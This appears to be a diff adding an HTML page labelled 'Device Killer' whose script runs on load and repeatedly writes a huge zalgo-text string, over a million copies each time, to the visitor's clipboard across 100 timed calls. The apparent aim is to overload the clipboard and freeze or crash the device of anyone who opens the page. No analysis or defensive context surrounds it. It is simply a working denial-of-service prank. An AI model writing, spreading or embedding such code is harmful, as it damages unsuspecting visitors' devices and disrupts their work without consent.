@@ -1,1 +1,40 @@
 
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <p style='font-size: 100px'>Device Killer</p>
+    
+    <script>
+    window.addEventListener('load', 
+      () => { 
+        spam()
+      });
+    function randomString(length) {
+        let result = '';
+        const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+        let counter = 0;
+        while (counter < length) {
+          result += characters.charAt(Math.floor(Math.random() * characters.length));
+          counter += 1;
+        }
+        return result;
+    }
+    let length = 1500000
+    let loops = 100
+    let delay = 1000
+    function test() {
+        navigator.clipboard.writeText('a̴̷̡͔͎̹̠͇̣ͤ̈̀͂́̇̑̚͝͞s̷͕͖͍͖̙̪ͨ̇̏ͨͧ͂̿ͪ̒͑̍̃͊d̡̢͙̪̥͕͇͈̹̩̺̯̫̖̉̍ͪͪ͌̋͒̈́̊̚͢͝͠͡͠ä̷͚͎̪̞̻̝̺̫̣̜̝̲̬́͌ͧ́̂̐̍ͭ̑̅͒̾̑ͤ̋͑̾ͦͩ̉̐ͣ͑͐̅̑̕̚͘͠͡'.repeat(length) + `${randomString(10)}`) 
+        
+      
+    }
+      
+    function spam() {
+      for (let i = 0; i < loops; i++) {
+        setTimeout(test, i * delay)
+      }
+    
+    }
+  </script>
+  </head>
+  <img src="image.png" alt="Gru">
+</html>
